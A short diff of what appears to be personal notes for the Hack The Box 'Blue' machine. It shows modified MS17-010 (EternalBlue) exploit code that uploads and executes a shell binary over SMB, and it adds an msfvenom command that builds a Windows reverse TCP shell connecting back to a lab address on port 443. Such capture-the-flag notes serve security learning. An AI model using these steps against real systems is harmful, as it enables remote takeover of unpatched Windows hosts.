@@ -61,5 +61,10 @@ git clone https://github.com/worawit/MS17-010.git
    smb_send_file(smbConn, '/root/htb/blue/puckieshell443.exe', 'C', '/puckieshell443.exe')
    
    service_exec(conn, r'cmd /c c:\\puckieshell443.exe')
+ 
+* custom payload:
+  * msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.28 LPORT=443 -f exe > shell.exe
+
+* need listner
 
  
